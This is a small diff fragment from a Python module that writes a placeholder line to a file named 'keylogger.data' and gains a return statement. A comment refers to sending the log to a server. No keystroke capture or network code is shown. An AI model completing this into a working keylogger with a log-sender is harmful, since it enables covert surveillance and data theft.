@@ -10,6 +10,8 @@ def run(**args):
 	log = open("data/abc/keylogger.data", "a")
 	log.write(" trying to Write something in Github directory \n")
 	log.close()
+	return "trying to Write something in Github directory \n"
+
 # send log to the server function
 #================= main Programs starts here ======================
 #start log_sender in 1 sec
